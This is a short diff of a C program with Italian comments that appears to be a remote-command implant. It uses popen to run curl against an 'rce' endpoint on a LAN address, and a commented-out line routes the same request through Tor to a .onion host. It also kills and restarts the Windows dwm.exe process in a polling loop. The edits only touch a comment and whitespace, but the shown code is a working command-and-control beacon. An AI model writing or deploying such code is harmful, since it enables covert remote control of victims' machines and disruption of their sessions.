@@ -155,7 +155,7 @@ int main() {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
         //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
-        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura.
+        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
@@ -245,7 +245,6 @@ int main() {
             system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
             system("start dwm.exe"); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
         }
-
         else {Sleep(20000);}
     }
     return 0;
